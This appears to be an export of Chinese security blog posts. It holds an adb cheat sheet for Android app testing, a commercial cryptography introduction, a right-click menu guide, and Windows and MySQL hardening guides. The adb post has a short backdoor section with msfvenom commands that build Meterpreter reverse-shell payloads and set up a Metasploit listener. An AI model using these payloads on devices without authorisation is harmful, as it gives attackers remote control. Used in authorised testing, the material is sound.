[{"title":"关于adb的一些常用命令","date":"2021-06-17T16:38:19.000Z","path":"2021/06/18/关于adb的一些常用命令/","text":"本文PDF格式的文档 https://laoel.github.io/aoe/pdf/Android-sec/%E5%85%B3%E4%BA%8Eadb%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.pdf 在做APP安全测试时（Android端）除了业务逻辑，也会经常要用一些adb命令，在此记录一下。 adb下载地址 https://adbshell.com/downloads Android SDK 平台工具软件包（含adb，有windows、Linux、MacOS版本） https://developer.android.google.cn/studio/releases/platform-tools 一些思路小记1、提取apk文件12345678910111213# 1.获取当前屏幕上正在运行的APP的包名和类名(获取包名)adb shell dumpsys window | grep mCurrentFocus# 2.获取某个应用的apk路径adb shell pm path &lt;pkg&gt;# 3.让adb获得root权限adb root# 4.提取apk文件到本地adb pull &lt;apk-path&gt; &lt;local-path&gt; # 如提取到当前目录(./也可以省略不写)：adb pull /system/priv-app/Settings/Settings.apk ./ 2、查看logcat日志信息首推 Android Device Monitor，很好用（界面化工具），可进行日志筛选、查找、导出等。 Tips:Android Device Monitor 已在Android Studio 3.1及以上版本中弃用，可自行下载 Android SDK 平台工具软件包 。 12# Android Device Monitor启动脚本路径&lt;android-sdk-path&gt;\\tools\\monitor.bat 然后就是通过命令来看了 查看指定进程号的logcat日志 (推荐使用此方法，看到的日志比较全) 1234# 根据包名、服务名查找PID（一个APP可能会有多个进程）adb shell ps |grep &lt;关键字：可以是包名、服务名等&gt;# 查看指定进程号的logcat日志adb logcat --pid=&lt;PID&gt; 打印从某个时间点开始的系统日志 123adb logcat -T \"月-日 00:00:00.000\" &gt; &lt;path/file-name&gt;# 如从6月10日12点这个时间点开始打印logcat日志adb logcat -T \"06-10 12:00:00.000\" &gt; logcat-06101200.txt 查看指定包名的logcat日志 1234# 打印指定包名的logcat日志adb logcat | findstr &lt;pkg&gt;# 输出到本地文件，按 CRTAL+C 停止。adb logcat | findstr pkg &gt; &lt;path/file-name&gt; Android logcat命令详解 https://www.cnblogs.com/jianxu/p/5468839.html 使用adb logcat命令显示Android设备上的Log日志 https://blog.csdn.net/wenzhi20102321/article/details/81058196 3、启动APP的方法 手动点击屏幕上的APP图标 借助frida强制重启APP（使用于某些场景，如没办法去点击APP图标） 1frida -U --no-pause -f &lt;pkg&gt; # 只需知道包名即可，不需要知道类名 使用adb命令启动APP 12adb shell am start -n &lt;pkg&gt;/&lt;activity-name&gt;adb shell am start -n &lt;pkg&gt;/.MainActivity 4、植入木马/后门 查看手机CPU架构。 1adb shell cat /proc/cpuinfo 使用msfvenom来生成木马/后门文件。 123msfvenom -a aarch64 --platform Linux -p linux/aarch64/meterperter_reverse_tcp -f elf LHOST=x.x.x.x LPORT=444 -o payloadmsfvenom -p android/meterpreter/reverse_tcp lhost=x.x.x.x lport=4444 R &gt; shell.apk 然后放到手机中（命令略）。 打开msf，进行监听。 123456msfconsoleuse exploit/multi/handlerset payload android/meterpreter/reverse_tcpset LHOST kali-ipshow optionsexploit 去手机中运行木马/后门程序（使用shell或点击app）。 再去msf中看是否上线。 Tips：也可以安装其他木马/后门APP或远程协助类的APP MSF入侵安卓手机 https://www.cnblogs.com/hkleak/p/4852057.html 一些常用的adb命令adb执行某些操作123456789101112131415#获取所有包名adb shell pm list packages#获取指定APP的所有信息adb shell dumpsys package &lt;pkg&gt;#打开系统设置界面adb shell am start -n com.android.settings/com.android.settings.Settings#打开浏览器（Android在adb shell里打开某个APP）am start -n com.android.browser/com.android.browser.BrowserActivity#调用浏览器打开某个网站am start -a android.intent.action.VIEW -d https://www.baidu.com#发短信（需手动点击发送）adb shell am start -a android.intent.action.SENDTO -d sms:10010 --es sms_body hello #查询CPU架构adb shell getprop ro.product.cpu.abi 启动Android四大组件1234567891011#启动Activity组件adb shell am start -n &lt;pkg&gt;/&lt;activity-name&gt;#启动service组件adb shell am startservice -n &lt;pkg&gt;/&lt;service-name&gt;#启动broadcast receiver组件adb shell am broadcast &lt;pkg&gt;/&lt;broadcast-name&gt;#启动组件adb shell am start -n &lt;pkg&gt;/&lt;service-name&gt; 传文件123adb pull &lt;手机路径&gt; &lt;本机路径&gt; # 从手机中拉取信息到本地电脑上adb push &lt;本机路径&gt; &lt;手机路径&gt; # 从本地电脑推送信息到手机上adb push 1.apk /data/local/tmp # 举例 adb配置wifi连接保持手机电脑在同一个wifi。先用数据线连电脑，执行下面命令后即可拔掉数据线。 另推荐一个APP（可实现此功能）：wifiadb 123456adb shell ifconfig wanl0 # 在连接数据线的情况下查看手机IP地址adb tcpip 5555 # 设置端口转发adb connect &lt;phone-ip&gt; #连接设备，此时可以拔掉数据线了adb devices # 验证是否连接成功adb disconnect &lt;phone-ip:port&gt; # 断开连接 adb通过wifi连接android设备 https://blog.csdn.net/wlly1/article/details/54912079 adb设置系统代理设置代理 12adb shell settings put global http_proxy &lt;代理IP地址:端口号&gt;adb shell settings put global http_proxy 192.168.53.99:8989 # 举例 移除代理 1adb shell settings delete global http_proxy &amp;&amp; adb shell settings delete global global_http_proxy_host &amp;&amp; adb shell settings delete global global_http_proxy_port &amp;&amp; adb reboot 注意：移除代理后要重启手机才能生效。设置代理可以多次设置，立即生效（即覆盖）。 使用第三方apkAndroidProxySetter工具可以帮助我们使用adb命令可以快速进行wifi代理的设置和清除GitHub地址： https://github.com/jpkrause/AndroidProxySetter下好apk后，安装到手机 adb install proxy-setter-debug-0.2.1.apk 设置代理 1adb shell am start -n tk.elevenk.proxysetter/.MainActivity -e host 代理IP地址 -e port 端口号 -e ssid WIFI名称 -e reset-wifi true -e key WIFI密码 如： 1adb shell am start -n tk.elevenk.proxysetter/.MainActivity -e host 127.0.0.1 -e port 8888 -e ssid YOUR-WIFI-NAME -e reset-wifi true -e key YOUR-WIFI-PASSWORD adb 修改手机代理方式 https://blog.csdn.net/userwyh/article/details/82430665 adb命令关闭指定APP1adb shell am force-stop &lt;pkg&gt; 查看进程12345#查找某个进程adb shell ps|findstr &lt;pkg&gt;#杀死某个进程adb shell am force-stop &lt;pkg&gt; 文本输入1adb shell input text '123' 按键输入12345678# 返回键adb shell input keyevent BACK# 返回键adb shell input keyevent 4# 电源键adb shell input keyevent 26# HOME 键adb shell input keyevent 3 adb命令模拟按键事件 KeyCode https://blog.csdn.net/jlminghui/article/details/39268419 模拟屏幕点击12# x，y为坐标位置adb shell input tap &lt;X&gt; &lt;Y&gt; ADB——模拟手机按键输入 https://www.cnblogs.com/zhuminghui/p/10457755.html 截屏和录屏1234567891011#截屏并保存在手机上的指定路径adb shell screencap -p /storage/emulated/0/DCIM/screenhot.png#截屏并保存在电脑上的指定路径adb adb exec-out screencap -p &gt; C:\\Users\\administrator\\Desktop\\screen.png#录屏60秒并保存在手机上的指定路径adb shell screenrecord --bit-rate 60 /sdcard/demo.mp4adb shell screenrecord --bit-rate 1000000 --size 2348x1080 /sdcard/demo.mp4 adb 截屏和录屏命令 https://blog.csdn.net/gdutxiaoxu/article/details/69802895 app自动化–Android使用adb命令录屏(上) https://blog.csdn.net/atnanyang/article/details/86479449 Android SDK Platform Tools 下载地址（内含adb） https://developer.android.google.cn/studio/releases/platform-tools","tags":[{"name":"adb","slug":"adb","permalink":"https://laoel.github.io/tags/adb/"},{"name":"常用命令","slug":"常用命令","permalink":"https://laoel.github.io/tags/常用命令/"}]},{"title":"商用密码介绍","date":"2020-12-04T16:01:49.000Z","path":"2020/12/05/商用密码介绍/","text":"概念介绍定义（引用密码法） 密码，是指采用特定变换的方法对信息等进行加密保护、安全认证的技术、产品和服务。 即密码非指我们平常用的口令，密码是包含三个要素的（明文、密文、密钥）。 密码分类（三种） 密码分为核心密码、普通密码和商用密码 核心密码、普通密码属于国家秘密。 商用密码用于保护不属于国家秘密的信息。公民、法人和其他组织可以依法使用商用密码保护网络与信息安全。 关于密码学的一些书籍 图解密码技术 第3版 https://item.jd.com/11942019.html 出版时间：2016-06-01 [日] 结城浩 著，周自恒 译 商用密码应用与安全性评估 https://item.jd.com/12865754.html 出版时间：2020-04-01 霍炜 著 一些单位机构目录 国家密码管理局 https://www.oscca.gov.cn 各省级密码管理局 北京市密码管理局天津市密码管理局河北省密码管理局山西省密码管理局内蒙古自治区密码管理局辽宁省密码管理局吉林省密码管理局黑龙江省密码管理局上海市密码管理局江苏省密码管理局浙江省密码管理局安徽省密码管理局福建省密码管理局江西省密码管理局山东省密码管理局河南省密码管理局湖北省密码管理局湖南省密码管理局广东省密码管理局广西壮族自治区密码管理局海南省密码管理局重庆市密码管理局四川省密码管理局贵州省密码管理局云南省密码管理局西藏自治区密码管理局陕西省密码管理局甘肃省密码管理局青海省密码管理局宁夏回族自治区密码管理局新疆维吾尔族自治区密码管理局新疆建设兵团密码管理局深圳市密码管理局 密码检测机构商用密码认证业务网站商用密码检测中心鼎铉商用密码测评技术有限公司 扩展阅读 密码法-百度百科 中国密码学会 密码行业标准化技术委员会 一图读懂国密系列算法","tags":[{"name":"商用密码","slug":"商用密码","permalink":"https://laoel.github.io/tags/商用密码/"},{"name":"国密","slug":"国密","permalink":"https://laoel.github.io/tags/国密/"}]},{"title":"一文教你搞定右键菜单的管理","date":"2020-11-08T03:10:59.000Z","path":"2020/11/08/一文教你搞定右键菜单的管理/","text":"有时候电脑程序安装多了，当你右击鼠标时会显示很长的菜单列表，这种情况，你是不是经常遇到 -_- 有点烦，对不对，那么右键菜单太多怎么办？如何管理右键菜单？ So，我们以Windows10为例，来看看，怎么解决这个问题。 思路1 直接去修改注册表注意：修改注册表之前，最好先导出备份一下。 其实这个是最根本的方法，其它基本所有思路，最终还是修改注册表。 那么关于管理右击菜单的一些常见路径，如下： 12345678#右键单击文件夹背景时（出现的情况）计算机\\HKEY_CLASSES_ROOT\\Directory\\Background\\shell#右键单击文件图标时（出现的情况）计算机\\HKEY_CLASSES_ROOT\\*\\shell#右键单击文件夹图标时（出现的情况）计算机\\HKEY_CLASSES_ROOT\\Directory\\shell 例如我要删除右击文件夹时菜单列表中的 IDEA程序的选项 进入路径，直接删除文件夹即可。 Windows右键菜单设置与应用技巧 https://sites.google.com/site/fenghuangsite/dian-nao/ruan-jian/windows-you-jian-cai-dan-she-zhi-yu-ying-yong-ji-qiao 思路2 通过安全类软件或第三方专门的软件 右键菜单太多怎么办？如何管理右键菜单？ https://jingyan.baidu.com/article/ff42efa94d176c819e2202e4.html Windows 10 如何清理右键菜单？ https://www.zhihu.com/question/55836048 添加自定义右键菜单 Windows10添加自定义右键菜单（详细步骤） https://blog.csdn.net/weixin_41010198/article/details/89286118 一行命令将Cmder添加到系统右键菜单中—-配置环境 https://blog.csdn.net/weixin_43064175/article/details/82562308 Windows下如何将cmd命令添加到右键菜单 https://blog.csdn.net/rchm8519/article/details/47991419","tags":[{"name":"小技巧","slug":"小技巧","permalink":"https://laoel.github.io/tags/小技巧/"},{"name":"右键菜单","slug":"右键菜单","permalink":"https://laoel.github.io/tags/右键菜单/"}]},{"title":"Windows安全加固","date":"2020-10-29T14:48:07.000Z","path":"2020/10/29/Windows安全加固/","text":"00 关注官方安全更新公告合规要求在不影响业务正常运行的情况下，及时更新系统，打补丁。 加固指南根据自己的需要进行筛选，即按日期范围、产品、严重性和影响搜索。也可以按 KB 或 CVE 编号搜索。 关于怎么打补丁这里就不介绍了（重要系统一定要先对补丁进行测试，打补丁可能会破坏系统的稳定性或出现bug等情况则会影响系统的正常运行），以及什么补丁是必需要打上的。 比如内网实现定期自动化批量更新补丁、云服务器又怎么打补丁、缺少重要补丁给出警告、定期进行主机层面的漏洞扫描 等等。 https://portal.msrc.microsoft.com/zh-cn/security-guidance 加固作用修复历史漏洞、在互联网披露的漏洞等，提高安全性。 01 配置密码策略合规要求1.启用密码必须符合复杂性要求，密码必须符合由数字、大写字母、小写字母、特殊字符，其中任意三种的组合。密码长度8位以上（包含8位）。密码不能包含用户名。密码有效期在1-180天的范围。至少不允许使用前5次的历史密码。2.用户无“密码永不过期”属性。 加固指南像密码复杂度，这个一定是要开启的。同样在新建账户时，口令需要符合密码策略。 另外，当某一个设置项存在冲突时，计算机管理与本地组策略相左时，以计算机管理中的配置为准。 1、打开 本地组策略 定位到密码策略，参照合规要求进行配置。 2、打开 计算机管理 定位到用户，检查所有用户的属性，应不勾选“密码永不过期”选项。 加固作用增强密码复杂度，并设置密码有效期，可防止攻击者猜解账户口令。 参考阅读 密码策略 - 微软文档 关于密码永不过期和密码策略中密码最常使用期限的问题讨论 Windows密码策略 02 配置登录失败处理功能合规要求在5分钟之内，连续错误登录次数15次后，至少锁定该账号5分钟。 加固指南打开 本地组策略 定位到密码策略，参照合规要求进行配置。 加固作用防止账户被暴力破解。 03 禁止账户自动登录合规要求系统不存在自动登录的账户。 加固指南有些人为了方便，喜欢开启自动登录，这样电脑一开机就自动登录了一个账户（一般为管理员账户），这样是存在安全隐患的。 打开“运行”窗口，输入 netplwiz ，所有用户都必须勾选“要使用本计算机，用户必须输入用户名和密码”。 加固作用防止近源渗透攻击、物理攻击。 04 禁止出现空口令账户合规要求系统不存在空口令的账户。 加固指南先使用管理员账户进入系统，查询系统可登录的账户，记下用户名，按Ctrl+Alt+Del去操作系统登录界面，一一测试（只输入用户名，不输入口令），看是否存在空口令账户。 然后查看组策略中安全选项中的账户策略，把“帐户: 使用空密码的本地帐户只允许进行控制台登录”这条策略改为已禁用，代表不允许存在空口令账户。 加固作用防止出现空口令账户。 05 关闭多余的文件共享合规要求1.只允许存在有业务需要的共享文件夹。2.共享权限中不应存在Everyone组，具体权限根据业务需要来定。 加固指南打开计算机管理找到共享或使用cmd输入net share命令，可查看当前的共享文件夹。 加固作用减少攻击面，避免一些已披露的漏洞。 06 关闭多余的端口合规要求遵循最小开放原则，根据业务判定，非必要端口禁止对外开放。 加固指南思路（不限于下面三种方法） 直接关闭或卸载占用非必要端口的程序； 利用windows自带防火墙进行访问控制； 在安全设备上设置ACL策略； 加固作用减少攻击面，避免一些已披露的漏洞。 参考阅读 https://blog.51cto.com/taihaikj/1925355 135、137、138、139、445等端口解释和关闭方法 https://blog.csdn.net/qq1124794084/article/details/51690981 netstat端口状态查看命令详解 - 黑面狐 07 关闭多余的服务合规要求遵循最小开放原则，根据业务判定，非必要服务禁止运行。 加固指南思路（不限于下面三种方法） 直接禁用非必要服务对应的程序； 把非必要服务设置为手动启动； 检查服务器开机自启的一些程序，看是否有非必要服务； 加固作用减少攻击面，避免一些已披露的漏洞。 08 卸载非必要组件和应用程序合规要求遵循最小开放原则，根据业务判定，非必要程序禁止安装使用。 加固指南思路：直接卸载非必要的程序和功能组件。 加固作用减少攻击面，避免一些已披露的漏洞。 09 启用安全审计功能合规要求对重要事件开启成功和失败的审核策略。 加固指南运行“gpedit.msc”在计算机配置-&gt;Windows设置-&gt;安全设置-&gt;本地策略-&gt;审核策略，启用相关策略。 123451. 审计帐户登录事件： 成功，失败； 6. 审计策略更改： 成功，失败 ；2. 审计帐户管理： 成功，失败 ； 7. 审计特权使用： 成功，失败 ；3. 审计目录服务访问： 成功，失败； 8. 审计系统事件： 成功，失败；4. 审计登录事件： 成功，失败 ； 9. 审计过程追踪： 失败；5. 审计对象访问： 成功，失败 ； 加固作用 用于溯源。 网络安全法规定：采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月； 其它建议 做好重要数据的备份工作（异地、冗余、热备等） 定期对服务器进行漏洞扫描和渗透测试，并修复所发现的漏洞 开启Windows防火墙 配置固定IP地址 站库分离 部署安全设备（防火墙、防毒墙、网关、态势感知 等等） 一些小知识注意： 文章的合规要求中具体的标准，参照了等保测评中的要求和其它国标文档等，也就是可以算是基线要求。实际配置的时候，应在满足基线要求的前提下，结合业务需求去配置具体的值，而不是仅仅配置为基线要求最低的值。 配置冲突问题当服务器配置有冲突时，优先级关系如下： 123域策略 &gt; 本地策略计算机管理 &gt; 组策略用户设置 &gt; 计算机设置 如果一个是域策略、一个是本地策略，设置相左时，以域策略为准； 如果一个是域策略、一个是本地策略，设置相左时，以域策略为准； 如果一个是计算机设置、一个是用户设置，设置相左时，以用户设置为准； 如果是同一个用户的两个相左的设置，以其中影响面比较小的那个为准。 扩展阅读Windows操作系统安全加固 https://help.aliyun.com/knowledge_detail/49781.html 安全基线-Microsoft Security Compliance Toolkit 1.0https://docs.microsoft.com/zh-cn/windows/security/threat-protection/security-compliance-toolkit-10 Windows Server CIS 基准 https://www.cisecurity.org/benchmark/microsoft_windows_server/","tags":[{"name":"windows","slug":"windows","permalink":"https://laoel.github.io/tags/windows/"},{"name":"安全加固","slug":"安全加固","permalink":"https://laoel.github.io/tags/安全加固/"}]},{"title":"MySQL安全加固","date":"2020-09-12T02:57:04.000Z","path":"2020/09/12/MySQL安全加固/","text":"前言打算出一个系列文章——各种对象的安全加固 近半年都在研究等保测评的相关内容，发现可以分享出来的东西就是整理一份安全加固的系列文章了。关于等保的测评点理解，FREEBUF上有位大佬写的非常好很细，值得细品。其它的也就不多说了。 觉得好的看完记得留个评论哈，有什么问题一起探讨。 等保测评2.0系列文章 - 起于凡而非于凡 https://www.freebuf.com/author/%E8%B5%B7%E4%BA%8E%E5%87%A1%E8%80%8C%E9%9D%9E%E4%BA%8E%E5%87%A1?type=article MySQL介绍MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL 是最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件之一。 MySQL是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。 MySQL所使用的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策，分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。 mysql目录结构 配置文件，也就是后缀为.cnf的文件，大家自己看看文件内容就知道每个文件的作用了。 我们来看mysql的帮助信息，里面有一条指明了mysql的配置文件是哪个，然后根据我们的情况就可以确定，mysql配置文件为/etc/mysql/my.cnf，因为其它两个文件不存在。 123root@NF:~# mysql --help |grep -A 1 'Default options'Default options are read from the following files in the given order:/etc/my.cnf /etc/mysql/my.cnf ~/.my.cnf 那我们查看一下/etc/mysql/my.cnf文件的内容（跟/etc/mysql/mysql.cnf内容一样），主要有下面这些信息，也说明了/etc/mysql/my.cnf是全局配置，~/.my.cnf（隐藏文件，本环境下无此文件）是个人用户设置。 12345678910# The MySQL database server configuration file.## You can copy this to one of:# - &quot;/etc/mysql/my.cnf&quot; to set global options,# - &quot;~/.my.cnf&quot; to set user-specific options.!includedir /etc/mysql/conf.d/#表示包含/etc/mysql/conf.d/这个路径下面的配置文件，前提是必须以为.cnf为后缀!includedir /etc/mysql/mysql.conf.d/#表示包含/etc/mysql/mysql.conf.d/这个路径下面的配置文件，前提是必须以为.cnf为后缀 然后我们看/etc/mysql/mysql.conf.d/mysql.conf.d，这个文件里面提供了mysql常用的基本配置。 那我们在此文件编辑mysql的配置，发现是可以失效的，它包含于/etc/mysql/my.cnf文件，所以编辑mysql配置的时候就编辑/etc/mysql/mysql.conf.d/mysql.conf.d文件即可。 其它的相关文件，其实就是理解linux各个主要目录是什么作用的。 1234567/usr/lib/mysql # 动态库文件（.so文件,so=shared object）/usr/bin/mysql # mysql命令，安装的软件的命令，usr指Unix System Resource/usr/share/mysql # mysql共享数据,主要是一些帮助文档/etc/mysql # mysql配置文件目录/etc/init.d/mysql # 服务管理脚本（启动，停止，关闭等）/var/lib/mysql # 默认的数据文档存储目录/var/log/mysql # mysql日志文件（查询语句记录，报错日志，慢查询日志等） Ubuntu中MySQL的参数文件my.cnf示例详析 - 潇湘隐者 【MySQL】MySQL的配置文件的区别和说明 - 十二翼堕落天使 linux .so文件详解 - 牧马人 00 关注官方安全更新公告在不影响业务正常运行的情况下，及时更新软件，打补丁。 https://www.oracle.com/security-alerts/ 01 禁止数据库用户的密码为空并设置密码有效期执行如下执行SQL语句检查密码是否为空： 123select user,host from mysql.user where length(authentication_string) = 0;或select user,host,authentication_string,password_lifetime,account_locked from mysql.user; 若存在空密码的数据库用户，则执行如下命令设置数据库用户密码，且密码必须满足密码策略的要求： 12set password for &apos;user&apos;@&apos;host&apos; = password(&apos;yourpassword&apos;);set password for &apos;testtest&apos;@&apos;192.168.56.1&apos; = password(&apos;testtest&apos;); 另外还要注意： 禁用或限制匿名、默认账户、测试账户的访问权限；（禁用账户） 应重命名或删除默认账户，修改默认账户的默认口令； 应及时删除或停用多余的、过期的账户，避免共享账户的存在； 删除了默认数据库TEST。（旧版本会有默认的测试数据库） 禁用数据库用户的语句 1ALTER USER &apos;user&apos;@&apos;host&apos; ACCOUNT LOCK; 查看密码有效期（全局变量） 1234567mysql&gt; show global variables like &apos;default_password_lifetime&apos;;+---------------------------+-------+| Variable_name | Value |+---------------------------+-------+| default_password_lifetime | 0 |+---------------------------+-------+1 row in set (0.00 sec) 配置密码有效期全局变量，编辑mysql配置文件，添加下面内容。 1default_password_lifetime = 180 配置某个用户的密码有效期，使用ALTER USER命令为每个具体的用户账户单独设置特定的值，它会自动覆盖密码过期的全局策略。要注意ALTER USER语句的INTERVAL的单位是“天”。 1ALTER USER &apos;root&apos;@&apos;localhost&apos; PASSWORD EXPIRE INTERVAL 180 DAY; 02 检查数据库用户的密码是否为弱口令有些人为了方便，可能会把数据库用户的密码设置为弱口令，现在的数据库会以mysql5加密算法加密口令，可以去MD5解密的平台输入密文，看能否得出明文。 https://www.cmd5.com/ https://www.somd5.com/ 如果是弱口令，则要求更改其数据库用户的口令。 关于MySQL密码你应该知道的那些事 - cenalulu MySQL：密码加密方式 - xuejianbest 03 密码复杂度配置在数据库配置文件/etc/mysql/mysql.conf.d/mysqld.cnf中添加如下配置（根据自身业务需要设置密码复杂度策略） 12345678[mysqld]plugin-load = \"validate_password.so\"validate-password = FORCE_PLUS_PERMANENTvalidate_password_length = 8 validate_password_policy = 1 validate_password_mixed_case_count = 1 validate_password_number_count = 1 validate_password_special_char_count = 1 validate-password = FORCE_PLUS_PERMANENT 值为FORCE_PLUS_PERMANENT表示强制启用该插件，并且不能被卸载。 validate_password_policy表示密码策略，有三个值，与其对应的策略见下表： 值 密码策略 0 或 LOW 校验密码长度变量 1 或 MEDIUM 校验密码长度、数字、小写/大写和特殊字符4个变量 2 或 STRONG 校验密码长度、数字、小写/大写、特殊字符和字典文件5个变量 简言之，对于密码数字、小写/大写和特殊字符这三个变量，只有当密码策略为中或强时才是有效的。 其它参数含义见下面的引用文章。 那么最低要求配置如下 效果：密码不能与用户名一致，密码长度8位以上（包含8位）、至少有一个数字、一个大写字母、一个小写字母、一个特殊字符。 12345678910111213mysql&gt; show variables like &apos;%validate_password%&apos;; +--------------------------------------+--------+ | Variable_name | Value | +--------------------------------------+--------+ | validate_password_check_user_name | OFF | | validate_password_dictionary_file | | | validate_password_length | 8 | | validate_password_mixed_case_count | 1 | | validate_password_number_count | 1 | | validate_password_policy | MEDIUM | | validate_password_special_char_count | 1 | +--------------------------------------+--------+ 7 rows in set (0.00 sec) 安装和卸载插件 validate_password插件相关参数的介绍 MySql5.6使用validate password 插件加强密码强度的安装及使用方法 - wangmm0218 04 登录失败和连接超时设置mysql有个连接超时的插件，相当于登录失败锁定策略，可根据业务需要进行最低配置。 默认配置如下： 123456789mysql&gt; show variables like &quot;%connection_control%&quot;;+-------------------------------------------------+-------+| Variable_name | Value |+-------------------------------------------------+-------+| connection_control_failed_connections_threshold | 3 || connection_control_max_connection_delay | 86400 || connection_control_min_connection_delay | 1000 |+-------------------------------------------------+-------+3 rows in set (0.00 sec) connection_control_failed_connections_threshold失败尝试的次数，默认为3，表示当连接失败3次后启用连接控制，0表示不开启connection_control_max_connection_delay响应延迟的最大时间connection_control_min_connection_delay响应延迟的最小时间，默认1000微秒，1秒 然后是超时时间设置。 查看和设置 连接超时相关的两个参数interactive_timeout和wait_timeout，其值应当至多为30分钟。 12345show global variables like &apos;interactive_timeout&apos;;show global variables like &apos;wait_timeout&apos;; set global interactive_timeout=1800;set global wait_timeout=1800; interactive_timeout：交互式连接超时时间(mysql工具、mysqldump等)wait_timeout：非交互式连接超时时间、默认的连接mysql api程序、jdbc连接数据库等 简单来说，通过mysql客户端连接数据库是交互式连接，通过jdbc连接数据库是非交互式连接。 连接控制插件安装 MySQL安全插件：Connection-Control Plugins 的利与弊 - leonpenn MySQL 插件之 连接控制插件(Connection-Control) - ZhenXing_Yu MySQL连接超时相关的两个参数interactive_timeout和wait_timeout的区别和解释 - young5201314 MySQL参数max_connect_errors分析释疑 - 潇湘隐者 MySQL状态变量Aborted_connects与Aborted_clients浅析 -海东潮 05 启用SSL查看是否启用SSL（如果启用了SSL，需要进行配置，才能正常远程连接管理）。 12345678mysql&gt; show variables like &apos;%ssl&apos;;+---------------+----------+| Variable_name | Value |+---------------+----------+| have_openssl | DISABLED || have_ssl | DISABLED |+---------------+----------+2 rows in set (0.01 sec) 说明：如果数据库禁止远程管理（select user,host from mysql.user;），则已经符合安全要求，此情况下已无需启用SSL。 MySQL SSL配置（mysql5.7和mysql5.6) - Yuki_xiong MYSQL SSL配置与使用 - 德莱華 06 远程管理限制其实最好还是应当禁止远程登录，至少要禁止root直接远程登录管理数据库。 执行select user,host from mysql.user where user=&#39;root&#39;; 看访问地址是否仅为 127.0.0.1 或 localhost 或 ::1 其它用户如需远程连接，应做访问范围限制。 执行select user,host from mysql.user where host = &#39;%&#39;; 若host字段为：% （允许任何IP连接），则说明不合规。 远程连接管理配置方法： 12GRANT ALL PRIVILEGES ON &lt;databases-name&gt;.* TO &apos;user&apos;@&apos;&lt;ip&gt;&apos; IDENTIFIED BY &apos;&lt;password&gt;&apos; WITH GRANT OPTION;FLUSH PRIVILEGES; 指定单个数据库名 也可以用 *（即所有数据库名） user 指定一个数据库用户名 指定一个IP、一个网段（包括B段、C段 192.168.1.%）、%（所有IP） 指定远程连接时使用的密码，与本地密码可不同（但需符合密码复杂度要求） 123# 举例，给数据库用户teacher分配student数据库，只允许192.168.56.%网段远程连接并设置口令为Admin123。GRANT ALL PRIVILEGES ON student.* TO &apos;teacher&apos;@&apos;192.168.56.%&apos; IDENTIFIED BY &apos;Admin123&apos; WITH GRANT OPTION;FLUSH PRIVILEGES; 效果如下 最后可以在mysql.user表中看到账号的情况，也是从这里删除。 12select user,host from mysql.user where account_locked=&apos;N&apos; and host!=&apos;localhost&apos;;drop user &apos;user&apos;@&apos;host&apos;; 知识补充-drop和delete的区别 dropdrop user XXX; 删除已存在的用户，默认删除的是&#39;XXX&#39;@&#39;%&#39;这个用户，如果还有其他的用户(其它主机名),如&#39;XXX&#39;@&#39;localhost&#39;等，不会一起被删除。如果要删除&#39;XXX&#39;@&#39;localhost&#39;，使用drop删除时需要加上host即drop user &#39;XXX&#39;@&#39;localhost&#39;。 deletedelete from user where user=&#39;XXX&#39; and host=&#39;localhost&#39;; 其中XXX为用户名，localhost为主机名(即需指定主机名)。 drop和delete的区别drop不仅会将user表中的数据删除，还会删除其他权限表的内容。 而delete只删除user表中的内容，所以使用delete删除用户后需要执行FLUSH PRIVILEGES;刷新权限，否则下次使用create语句创建用户时会报错。 07 会话连接数配置配置同样是在mysql配置文件中添加相关参数（max_connections = 100）。 12345678mysql&gt; show variables like &quot;%connections&quot;;+----------------------+-------+| Variable_name | Value |+----------------------+-------+| max_connections | 100 || max_user_connections | 0 |+----------------------+-------+2 rows in set (0.01 sec) max_connections是对整个服务器的用户做出限制，max_user_connections是对每个用户的限制，为0表示不限制。 12root@NF:~$ grep max_connections /etc/mysql/mysql.conf.d/mysqld.cnfmax_connections = 100 MySQL参数最大连接数max_connections - paul_hch 08 启用日志审计mysql默认启用日志审计，记录的内容也符合相关安全要求，此项默认符合。 查看日志启用情况 查看变量，看相关日志是否启用show variables like &#39;log%&#39;; 或看mysql的配置文件，看相关日志的配置情况（根据业务需要启用相关日志和设置日志保存路径。） 12345678910111213141516171819202122232425262728293031# * Logging and Replication## Both location gets rotated by the cronjob.# Be aware that this log type is a performance killer.# As of 5.1 you can enable the log at runtime!#通用日志，将所有到达MySQL Server的SQL语句记录下来general_log_file = /var/log/mysql/mysql.loggeneral_log = 1log_timestamps = SYSTEM## Error log - should be very few entries.#错误日志,文件内容不会很多log_error = /var/log/mysql/error.log## Here you can see queries with especially long duration#慢查询日志，记录SQL执行语句（执行时间超过2秒才会记录）slow_query_log = 1slow_query_log_file = /var/log/mysql/mysql-slow.loglong_query_time = 2log-queries-not-using-indexes## The following can be used as easy to replay backup logs or for replication.# note: if you are setting up a replication slave, see README.Debian about# other settings you may need to change.#二进制日志server-id = 1log_bin = /var/log/mysql/mysql-bin.logexpire_logs_days = 10max_binlog_size = 100M#binlog_do_db = include_database_name#binlog_ignore_db = include_database_name 来看一下日志内容，日志默认是分天存储的，一天一个文件并压缩保存。 相关日志（主要是查询日志和错误日志）应留存6个月以上。 日志记录的日期和时间应当是正确的，服务器需开启了NTP服务进行时间校对。 123#Linux 检查NTP服务时间同步情况ntpq -p -nntpstat 09 禁止.mysql_history文件记录信息.mysql_history文件会记录MySQL操作历史（即数据库查询语句），包含敏感信息。为了避免敏感信息泄露，需要禁止使用。检查所有.mysql_history文件是否链接到dev/null，若没连接到，则以root用户执行如下命令： 123find / -name \".mysql_history\" | xargsrm &lt;your_path&gt;/.mysql_history ln -s /dev/null &lt;your_path&gt;/.mysql_history 10 禁止mysql对系统文件进行读写操作local_infile变量表示能否使用load data local infile命令。该变量默认为ON。 该变量为OFF时，禁用客户端使用load data local infile命令。避免通过数据库查询语句造成的任意文件读写漏洞。 执行如下SQL语句： 1show variables like &apos;local_infile&apos;; 